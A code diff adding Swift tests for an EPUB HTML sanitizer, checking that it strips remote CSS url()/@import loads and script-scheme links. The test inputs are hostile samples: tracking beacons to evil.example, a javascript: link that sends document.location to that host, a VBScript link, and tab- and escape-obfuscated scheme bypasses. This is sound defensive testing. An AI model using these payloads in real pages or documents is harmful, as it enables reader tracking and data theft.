@@ -149,6 +149,62 @@ import Foundation
         #expect(!EpubSanitizer.isRemote(""))
     }
 
+    @Test func sanitizerStripsRemoteCSS() {
+        // Zero-click subresource loads: a remote `url()` in a <style> block or an inline style
+        // attribute fetches on render. Neither survives.
+        let clean = EpubSanitizer.sanitize("""
+            <html><head>
+              <style>@import url("https://evil.example/beacon.css"); body{background:url(https://evil.example/bg.png)}</style>
+            </head><body>
+              <p style="background-image:url(https://evil.example/track.png)">a</p>
+              <p style="background:url(//evil.example/track2.png)">b</p>
+              <p style="background:url(\\68ttps://evil.example/esc.png)">e</p>
+              <p style="color:red">c</p>
+              <div style="background:url(images/local.png)">d</div>
+            </body></html>
+            """)
+        #expect(!clean.contains("evil.example"))          // every remote CSS ref gone (incl. escaped)
+        #expect(!clean.lowercased().contains("<style"))    // style element dropped wholesale
+        #expect(!clean.lowercased().contains("@import"))
+        #expect(clean.contains("color:red"))               // benign inline style kept
+        // Any url()-bearing inline style is dropped wholesale — we can't trust a remote/local
+        // distinction once CSS escapes are in play — so even the local one goes.
+        #expect(!clean.contains("images/local.png"))
+        #expect(clean.contains("<div"))                    // …but the element itself remains
+    }
+
+    @Test func sanitizerStripsScriptSchemeLinks() {
+        let clean = EpubSanitizer.sanitize("""
+            <html><body>
+              <a href="javascript:fetch('https://evil.example/'+document.location)">x</a>
+              <a href="VBScript:msgbox(1)">y</a>
+              <a href="ch2.xhtml#top">local</a>
+              <form action="javascript:steal()"><input/></form>
+            </body></html>
+            """)
+        #expect(!clean.lowercased().contains("javascript:"))
+        #expect(!clean.lowercased().contains("vbscript:"))
+        #expect(clean.contains("ch2.xhtml#top"))           // ordinary local link preserved
+    }
+
+    @Test func schemeAndCSSClassification() {
+        #expect(EpubSanitizer.hasDangerousScheme("javascript:alert(1)"))
+        #expect(EpubSanitizer.hasDangerousScheme("  JavaScript:alert(1)"))
+        #expect(EpubSanitizer.hasDangerousScheme("vbscript:x"))
+        #expect(EpubSanitizer.hasDangerousScheme("java\tscript:x"))   // tab obfuscation
+        #expect(EpubSanitizer.hasDangerousScheme("java\nscript:x"))   // newline obfuscation
+        #expect(!EpubSanitizer.hasDangerousScheme("https://x/a"))
+        #expect(!EpubSanitizer.hasDangerousScheme("ch1.xhtml"))
+        // Any url()/@import-bearing style is dropped — remote, protocol-relative, escaped, OR local.
+        #expect(EpubSanitizer.styleMayLoadResource("background:url(https://x/a.png)"))
+        #expect(EpubSanitizer.styleMayLoadResource("background:url(//x/a.png)"))
+        #expect(EpubSanitizer.styleMayLoadResource("background:url(\\68ttps://x/a.png)"))
+        #expect(EpubSanitizer.styleMayLoadResource("@import 'x.css'"))
+        #expect(EpubSanitizer.styleMayLoadResource("background:url(images/a.png)"))
+        #expect(!EpubSanitizer.styleMayLoadResource("color:red"))
+        #expect(!EpubSanitizer.styleMayLoadResource(""))
+    }
+
     @Test func extractedHTMLOnDiskIsSanitized() throws {
         let url = try SyntheticEpub.make(flavour: .nav, remoteRefs: true)
         defer { try? FileManager.default.removeItem(at: url) }
